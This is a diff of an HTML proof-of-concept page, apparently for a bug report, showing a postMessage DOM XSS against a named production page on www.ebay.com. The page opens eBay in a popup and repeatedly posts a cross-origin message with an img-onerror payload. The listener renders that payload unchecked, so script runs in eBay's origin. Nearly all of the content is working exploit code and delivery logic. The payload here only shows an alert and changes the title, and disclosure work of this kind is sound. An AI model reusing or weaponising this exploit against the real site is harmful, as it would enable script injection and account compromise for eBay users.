@@ -15,31 +15,35 @@
 </head>
 <body>
 <h2>Security PoC — postMessage DOM XSS on www.ebay.com</h2>
-<p>One click opens <code>https://www.ebay.com/buyer-preferences/test</code> and sends a
-cross-origin <code>postMessage</code>. The page's message listener has no origin check and
-renders the <code>type</code> field via <code>dangerouslySetInnerHTML</code>, so the payload
-executes in the <b>www.ebay.com</b> origin.</p>
+<p>Click the button. It opens <code>https://www.ebay.com/buyer-preferences/test</code> in a
+<b>focused popup window</b> and sends a cross-origin <code>postMessage</code>. The page's listener
+has no origin check and renders the <code>type</code> via <code>dangerouslySetInnerHTML</code>,
+so the payload executes in the <b>www.ebay.com</b> origin.</p>
 
 <button id="go">Open eBay &amp; fire XSS</button>
 <div id="log"></div>
 
-<p class="note">Expected: a popup loads eBay's "Test Page", then an <code>alert()</code> showing
-<b>www.ebay.com</b> fires inside that popup (arbitrary JS executed in eBay's origin, delivered
-cross-origin from this page). The one click is only needed so the browser allows the popup.</p>
+<p class="note">A popup <b>window</b> (not a background tab) opens so the <code>alert()</code> is not
+suppressed. Within ~1s an <code>alert("XSS in www.ebay.com")</code> appears in that window. If a
+browser still blocks the alert, the popup's <b>tab/window title</b> also changes to
+<code>XSSED-www.ebay.com</code> as backup proof.</p>
 
 <script>
-var PAYLOAD = { type: "<img src=x onerror=alert('XSS in '+document.domain)>" };
+// payload: pop an alert AND set the title (title survives even if alert is suppressed)
+var PAYLOAD = { type: "<img src=x onerror=\"document.title='XSSED-'+document.domain;alert('XSS in '+document.domain)\">" };
 function log(m){ document.getElementById('log').textContent += m + "\n"; }
 document.getElementById('go').onclick = function () {
-  var w = window.open('https://www.ebay.com/buyer-preferences/test', 'eb');
-  if (!w) { log('[!] popup blocked — allow popups for this site and retry'); return; }
-  log('[*] opened eBay test page; posting payload every 500ms …');
+  // size features -> real popup WINDOW, which receives focus (so alert() is shown, not suppressed)
+  var w = window.open('https://www.ebay.com/buyer-preferences/test', 'ebxss', 'popup=yes,width=1000,height=760,left=120,top=80');
+  if (!w) { log('[!] popup blocked — click the blocked-popup icon in the address bar, Always Allow, retry'); return; }
+  try { w.focus(); } catch (e) {}
+  log('[*] popup opened; posting payload every 500ms …');
   var n = 0;
   var t = setInterval(function () {
-    try { w.postMessage(PAYLOAD, '*'); n++; log('[+] postMessage #' + n + ' sent'); }
+    try { w.focus(); w.postMessage(PAYLOAD, '*'); n++; log('[+] postMessage #' + n + ' sent'); }
     catch (e) { log('[!] ' + e); }
   }, 500);
-  setTimeout(function () { clearInterval(t); log('[*] done.'); }, 10000);
+  setTimeout(function () { clearInterval(t); log('[*] done (check the popup window).'); }, 12000);
 };
 </script>
 </body>
